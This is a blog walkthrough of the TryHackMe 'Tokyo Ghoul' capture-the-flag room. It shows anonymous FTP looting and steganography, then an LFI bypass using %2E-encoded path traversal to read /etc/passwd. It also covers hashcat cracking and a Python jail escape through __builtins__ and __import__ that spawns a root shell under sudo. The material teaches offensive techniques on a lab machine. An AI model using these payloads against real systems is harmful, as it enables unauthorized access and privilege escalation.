---
layout: post
title: TryHackMe Walkthrough - Tokyo Ghoul
date: 2021-06-14
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Boot2Root
- Medium
permalink: /2021/06/TokyoGhoul
img: 2021/06/TokyoGhoul/TokyoGhoul.jpeg
---

This room was inspired by the room [Psycho Break](https://tryhackme.com/room/psychobreak) for which I also did a [walkthrough](/2021/03/TryHackMe-Walkthrough-PsychoBreak/). In this room, I had to exploit an anonymous FTP, some steganography, [Local File Inclusion (LFI)](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/) and escape some Python jail. This room is of medium difficulty, but the questions in the tasks really helps knowing what you need to look for.

* Room: Tokyo Ghoul
* Difficulty: Medium
* URL: https://tryhackme.com/room/tokyoghoul666
* Authors:
	* [devalfo](https://tryhackme.com/p/devalfo)
	* [rockyou.txt](https://tryhackme.com/p/rockyou.txt)

```
This room took a lot of inspiration from psychobreak , and it is based on Tokyo Ghoul anime.

Alert: This room can contain some spoilers 'only s1 and s2 ' so if you are interested to watch the anime, wait till you finish the anime and come back to do the room 

The machine will take some time, just go grab some water or make a coffee.

This room contains some non-pg13 elements in the form of narrative descriptions. Please proceed only at your own comfort level. 
```

## Task 2 - Where am i?
I started the room by scanning for opened ports.

```bash
$ nmap -A -oN nmap.txt target
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 17:09 EDT
Nmap scan report for target (10.10.144.195)
Host is up (0.23s latency).
Not shown: 996 closed ports
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 need_Help?
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.3.36
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fa:9e:38:d3:95:df:55:ea:14:c9:49:d8:0a:61:db:5e (RSA)
|   256 ad:b7:a7:5e:36:cb:32:a0:90:90:8e:0b:98:30:8a:97 (ECDSA)
|_  256 a2:a2:c8:14:96:c5:20:68:85:e5:41:d0:aa:53:8b:bd (ED25519)
80/tcp   open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome To Tokyo goul
5102/tcp filtered admeng
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.61 seconds

```

There are three opened ports: 21 (FTP), 22 (SSH), and 80 (HTTP). This gave me the answers for the two questions of that section.

```
How many ports are open ? 
3

What is the OS used ?
ubuntu
```

## Task 3 - Planning to escape

nmap showed that the FTP port is opened and accepts anonymous connections. So I immediately went and look at it. I found and downloaded three files from the FTP server.

```bash
$ ftp target
Connected to target.
220 (vsFTPd 3.0.3)
Name (target:ehogue): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -la
200 PORT command successful. Consider using PASV.
c150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 .
drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 ..
drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 need_Help?
d 226 Directory send OK.

ftp> cd need_Help?
250 Directory successfully changed.

ftp> ls -la
200 PORT command successful. Consider using PASV.
g150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 .
drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 ..
-rw-r--r--    1 ftp      ftp           480 Jan 23 22:26 Aogiri_tree.txt
drwxr-xr-x    2 ftp      ftp          4096 Jan 23 22:26 Talk_with_me
226 Directory send OK.

ftp> get Aogiri_tree.txt
local: Aogiri_tree.txt remote: Aogiri_tree.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Aogiri_tree.txt (480 bytes).
226 Transfer complete.
480 bytes received in 0.00 secs (526.0943 kB/s)

ftp> cd Talk_with_me
250 Directory successfully changed.

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jan 23 22:26 .
drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 ..
-rwxr-xr-x    1 ftp      ftp         17488 Jan 23 22:26 need_to_talk
-rw-r--r--    1 ftp      ftp         46674 Jan 23 22:26 rize_and_kaneki.jpg
226 Directory send OK.

ftp> get need_to_talk
local: need_to_talk remote: need_to_talk
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for need_to_talk (17488 bytes).
226 Transfer complete.
17488 bytes received in 0.23 secs (74.3154 kB/s)

ftp> get rize_and_kaneki.jpg
local: rize_and_kaneki.jpg remote: rize_and_kaneki.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for rize_and_kaneki.jpg (46674 bytes).
226 Transfer complete.
46674 bytes received in 0.58 secs (78.0291 kB/s)

ftp> exit
221 Goodbye.
```

The first file is a text file that contain some text related to the series. 

```bash
$ file Aogiri_tree.txt 
Aogiri_tree.txt: ASCII text

$ cat Aogiri_tree.txt 
Why are you so late?? i've been waiting for too long .
So i heard you need help to defeat Jason , so i'll help you to do it and i know you are wondering how i will. 
I knew Rize San more than anyone and she is a part of you, right?
That mean you got her kagune , so you should activate her Kagune and to do that you should get all control to your body , i'll help you to know Rise san more and get her kagune , and don't forget you are now a part of the Aogiri tree .
Bye Kaneki.
```

There was an image that did not appear to contain anything interesting at first glance.
```
$ file rize_and_kaneki.jpg 
rize_and_kaneki.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1024x576, components 3
ehogue@kali:~/Kali/OnlineCTFs/TryHackMe/TokyoGhoul$ binwalk rize_and_kaneki.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

$ steghide extract -sf rize_and_kaneki.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!

$ strings rize_and_kaneki.jpg | less
JFIF
)$+*($''-2@7-0=0''8L9=CEHIH+6OUNFT@GHE
!E.'.EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
$3br
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
        #3R
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
HcDi
HK99$
c@=@
W7uw-
...
```

![Rize And Kaneki](/assets/images/2021/06/TokyoGhoul/rize_and_kaneki.jpg "Rize And Kaneki")


And the last file was a Linux executable.
```bash
$ file need_to_talk 
need_to_talk: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=adba55165982c79dd348a1b03c32d55e15e95cf6, for GNU/Linux 3.2.0, not stripped

ehogue@kali:~/Kali/OnlineCTFs/TryHackMe/TokyoGhoul$ file rize_and_kaneki.jpg 
rize_and_kaneki.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1024x576, components 3

```

The executable requires a key, but when you enter the wrong one it tells you how to get it.

```bash
$ ./need_to_talk 
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> a
Hmm. I don't think this is what I was looking for.
Take a look inside of me. rabin2 -z

$ rabin2 -z need_to_talk 
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00002008 0x00002008 9   10   .rodata ascii KEY_1
1   0x00002018 0x00002018 37  38   .rodata ascii Hey Kaneki finnaly you want to talk \n
2   0x00002040 0x00002040 82  83   .rodata ascii Unfortunately before I can give you the kagune you need to give me the paraphrase\n
3   0x00002098 0x00002098 35  36   .rodata ascii Do you have what I'm looking for?\n\n
4   0x000020c0 0x000020c0 47  48   .rodata ascii Good job. I believe this is what you came for:\n
5   0x000020f0 0x000020f0 51  52   .rodata ascii Hmm. I don't think this is what I was looking for.\n
6   0x00002128 0x00002128 36  37   .rodata ascii Take a look inside of me. rabin2 -z\n

$ ./need_to_talk 
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?

> KEY_1
Good job. I believe this is what you came for:
KEY_2
```

There are no information about where to use this key. I tried it on the image with steghide. And it gave me a new file containing some Morse code.

```bash
$ steghide extract -sf rize_and_kaneki.jpg 
Enter passphrase: KEY_2
wrote extracted data to "yougotme.txt".

$ cat yougotme.txt 
haha you are so smart kaneki but can you talk my code 

..... .-
....- ....-
....- -....
--... ----.
....- -..
...-- ..---
....- -..
...-- ...--
....- -..
....- ---..
....- .-
...-- .....
..... ---..
...-- ..---
....- .
-.... -.-.
-.... ..---
-.... .
..... ..---
-.... -.-.
-.... ...--
-.... --...
...-- -..
...-- -..


if you can talk it allright you got my secret directory 

```

I copied the code and created a [CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',true)&input=Li4uLi4gLi0KLi4uLi0gLi4uLi0KLi4uLi0gLS4uLi4KLS0uLi4gLS0tLS4KLi4uLi0gLS4uCi4uLi0tIC4uLS0tCi4uLi4tIC0uLgouLi4tLSAuLi4tLQouLi4uLSAtLi4KLi4uLi0gLS0tLi4KLi4uLi0gLi0KLi4uLS0gLi4uLi4KLi4uLi4gLS0tLi4KLi4uLS0gLi4tLS0KLi4uLi0gLgotLi4uLiAtLi0uCi0uLi4uIC4uLS0tCi0uLi4uIC4KLi4uLi4gLi4tLS0KLS4uLi4gLS4tLgotLi4uLiAuLi4tLQotLi4uLiAtLS4uLgouLi4tLSAtLi4KLi4uLS0gLS4u) to decode it. It gave me the name of a folder: `d1r3c70ry_center`. 

I then started to look at the web site on port 80.

![Main Site](/assets/images/2021/06/TokyoGhoul/MainSite.png "Main Site")

More on the story in the series. I looked at the source, there is a hint about the anonymous FTP, but I already looked at it.

```html
<!-- look don't tell jason but we will help you escape we will give you the key to open those chains and here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there -->
```

I clicked on the link, and it took me to [jasonroom.html](http://target.thm/jasonroom.html) where there is another hint about the FTP in a comment. 

![Jason Room](/assets/images/2021/06/TokyoGhoul/JasonRoom.png "Jason Room")
```html
<!-- look don't tell jason but we will help you escape , here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there you will find a freind who will help you -->
```

Wit this I had the answer to the two questions in that task.
```
Did you find the note that the others ghouls gave you? where did you find it ? 
jasonroom.html

What is the key for Rize executable?
KEY_1
```


## Task 4 - What Rize is trying to say?

I then loaded the [directory found in the Morse](http://target.thm/d1r3c70ry_center/) code. I just contained an image and a message saying to scan it.

![d1r3c70ry_center](/assets/images/2021/06/TokyoGhoul/d1r3c70ry_center.png "d1r3c70ry_center")

I used Gobuster to find hidden file or directory. 
```bash
$ gobuster dir -e -u http://target.thm/d1r3c70ry_center/ -t30 -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm/d1r3c70ry_center/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/06/10 18:02:35 Starting gobuster in directory enumeration mode
===============================================================
http://target.thm/d1r3c70ry_center/.htpasswd            (Status: 403) [Size: 275]
http://target.thm/d1r3c70ry_center/.hta                 (Status: 403) [Size: 275]
http://target.thm/d1r3c70ry_center/.htaccess            (Status: 403) [Size: 275]
http://target.thm/d1r3c70ry_center/claim                (Status: 301) [Size: 325] [--> http://target.thm/d1r3c70ry_center/claim/]
http://target.thm/d1r3c70ry_center/index.html           (Status: 200) [Size: 312]     
```

If found a sub directory called [claim](http://target.thm/d1r3c70ry_center/claim/). 
![Claim](/assets/images/2021/06/TokyoGhoul/Claim.png "Claim").

The page is pretty simple. The `Main Page` link took me to [http://target.thm/d1r3c70ry_center/claim/index.php](http://target.thm/d1r3c70ry_center/claim/index.php). While both `Yes` and `No` took me to [http://target.thm/d1r3c70ry_center/claim/index.php?view=flower.gif](http://target.thm/d1r3c70ry_center/claim/index.php?view=flower.gif).

This looks like it including the file passed to the `view` query parameter. It's probably vulnerable to LFI.

I started playing around with the parameter. Passing `/etc/passwd` did not work. If I tried anything with `..` or `user` in it, it will tell me "no no no silly don't do that". 

I also tried loading the [index.php file as base64](http://target.thm/d1r3c70ry_center/claim/index.php?view=php://filter/convert.base64-encode/resource=index.php) and that also failed. 

Then I tried to escape the dots with %2E, and after some struggling it worked. I was able to load [`/etc/passwd`](http://target.thm/d1r3c70ry_center/claim/index.php?view=%2E%2E/%2E%2E/%2E%2E/etc/passwd). It contained a user with it's hashed password. 

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash
```

I copied the hash and saved it into a file. Then I used hashcat to crack it.

```bash
$ hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:PASSWORD
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIy...fGxJI0
Time.Started.....: Thu Jun 10 20:01:49 2021 (1 sec)
Time.Estimated...: Thu Jun 10 20:01:50 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      823 H/s (3.64ms) @ Accel:16 Loops:512 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1408/14344385 (0.01%)
Rejected.........: 0/1408 (0.00%)
Restore.Point....: 1376/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000
Candidates.#1....: jesse -> tagged

Started: Thu Jun 10 20:01:40 2021
Stopped: Thu Jun 10 20:01:51 2021
```

This gave me the answer to the last question of the task.

```
What the message mean did you understand it ? what it says?
d1r3c70ry_center

what is rize username ?
kamishiro

what is rize password ?
PASSWORD
```

## Task 5 - Fight Jason

Now I had some credentials to connect with SSH. 

```bash
$ ssh kamishiro@target
...

kamishiro@vagrant:~$ cat user.txt 
USER_FLAG
```

I had the user flag, now I needed a way to gain root. I checked if the user could run sudo. And it could.

```bash
kamishiro@vagrant:~$ sudo -l
Matching Defaults entries for kamishiro on vagrant.vm:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kamishiro may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/kamishiro/jail.py

kamishiro@vagrant:~$ ls -l jail.py 
-rw-r--r-- 1 root root 588 Jan 23 22:27 jail.py

```

I could run a Python script as any user. The script was not writable, so I needed to find a way to get a shell with it.

```bash
kamishiro@vagrant:~$ cat jail.py
```

```python
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()
```

The script will run some Python code that I could provide. But the code could not contain some commands. And all the ways I could think of to get a shell would require at least one of the forbidden keywords. 

I searched for ways to escape a Python Jail online. I found [a page](https://anee.me/escaping-python-jails-849c65cf306e) that had a script almost identical to the one I had to escape.

The page describe how you can use the [Python builtins](https://docs.python.org/3/library/builtins.html) to access built-in objects it python. And how you can list them.

```python
>>> print(__builtins__.__dict__)
{'complex': <class 'complex'>, 'max': <built-in function max>, 'reversed': <class 'reversed'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'round': <built-in function round>, 'iter': <built-in function iter>, 'eval': <built-in function eval>, 'AssertionError': <class 'AssertionError'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'super': <class 'super'>, 'list': <class 'list'>, 'InterruptedError': <class 'InterruptedError'>, 'id': <built-in function id>, 'FileExistsError': <class 'FileExistsError'>, 'RuntimeError': <class 'RuntimeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'str': <class 'str'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'set': <class 'set'>, 'zip': <class 'zip'>, 'bool': <class 'bool'>, 'slice': <class 'slice'>, 'None': None, 'print': <built-in function print>, 'IndentationError': <class 'IndentationError'>, 'EOFError': <class 'EOFError'>, 'len': <built-in function len>, 'UnicodeError': <class 'UnicodeError'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'divmod': <built-in function divmod>, 'float': <class 'float'>, 'FutureWarning': <class 'FutureWarning'>, 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands
    for supporting Python development.  See www.python.org for more information., 'MemoryError': <class 'MemoryError'>, 'tuple': <class 'tuple'>, 'IOError': <class 'OSError'>, 'TabError': <class 'TabError'>, 'type': <class 'type'>, '__build_class__': <built-in function __build_class__>, 'property': <class 'property'>, 'chr': <built-in function chr>, 'repr': <built-in function repr>, 'map': <class 'map'>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'BaseException': <class 'BaseException'>, 'exec': <built-in function exec>, '__package__': '', 'dict': <class 'dict'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'bytearray': <class 'bytearray'>, 'EnvironmentError': <class 'OSError'>, 'NotImplemented': NotImplemented, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'bin': <built-in function bin>, 'any': <built-in function any>, 'frozenset': <class 'frozenset'>, 'compile': <built-in function compile>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), 'memoryview': <class 'memoryview'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'sum': <built-in function sum>, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'KeyError': <class 'KeyError'>, 'vars': <built-in function vars>, 'ImportError': <class 'ImportError'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'open': <built-in function open>, 'min': <built-in function min>, '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", 'BufferError': <class 'BufferError'>, 'Exception': <class 'Exception'>, 'True': True, 'Ellipsis': Ellipsis, 'TypeError': <class 'TypeError'>, 'format': <built-in function format>, 'ArithmeticError': <class 'ArithmeticError'>, 'getattr': <built-in function getattr>, 'OSError': <class 'OSError'>, 'False': False, 'RecursionError': <class 'RecursionError'>, 'ImportWarning': <class 'ImportWarning'>, 'BytesWarning': <class 'BytesWarning'>, '__debug__': True, 'SystemExit': <class 'SystemExit'>, 'AttributeError': <class 'AttributeError'>, 'GeneratorExit': <class 'GeneratorExit'>, 'NameError': <class 'NameError'>, '__name__': 'builtins', 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'SystemError': <class 'SystemError'>, 'bytes': <class 'bytes'>, 'setattr': <built-in function setattr>, 'PermissionError': <class 'PermissionError'>, 'hash': <built-in function hash>, 'ConnectionError': <class 'ConnectionError'>, 'filter': <class 'filter'>, 'FloatingPointError': <class 'FloatingPointError'>, 'enumerate': <class 'enumerate'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'delattr': <built-in function delattr>, 'abs': <built-in function abs>, 'dir': <built-in function dir>, 'ascii': <built-in function ascii>, 'StopIteration': <class 'StopIteration'>, 'ResourceWarning': <class 'ResourceWarning'>, 'hasattr': <built-in function hasattr>, 'globals': <built-in function globals>, 'all': <built-in function all>, 'UserWarning': <class 'UserWarning'>, 'callable': <built-in function callable>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'TimeoutError': <class 'TimeoutError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'range': <class 'range'>, 'license': Type license() to see the full license text, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'issubclass': <built-in function issubclass>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, 'Warning': <class 'Warning'>, 'IndexError': <class 'IndexError'>, 'locals': <built-in function locals>, 'sorted': <built-in function sorted>, 'ord': <built-in function ord>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, '__import__': <built-in function __import__>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'LookupError': <class 'LookupError'>, 'hex': <built-in function hex>, 'pow': <built-in function pow>, 'ValueError': <class 'ValueError'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'input': <built-in function input>, 'int': <class 'int'>, 'ReferenceError': <class 'ReferenceError'>, 'oct': <built-in function oct>, 'help': Type help() for interactive help, or help(object) for help about object., 'next': <built-in function next>, 'object': <class 'object'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'classmethod': <class 'classmethod'>, 'BlockingIOError': <class 'BlockingIOError'>, 'copyright': Copyright (c) 2001-2016 Python Software Foundation.
```

I could then use this to access the functions I needed. Using capital letters to evade some keywords. This allowed me to start a new bash as root.
	
```bash
sudo /usr/bin/python3 /home/kamishiro/jail.py
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__IMPORT__'.lower()]('pty').spawn("/bin/bash")
	
root@vagrant:~# whoami
root
	
root@vagrant:~# cat /root/root.txt 
ROOT_FLAG
```

## The End
This was an interesting room. I struggled a little bit exploiting the LFI. Somehow the first time I tried to escape the dots it failed. I might have not gone back far enough in the folder hierarchy. 

And I would never had been able to solve the Python Jail escaping without the blog post I found. 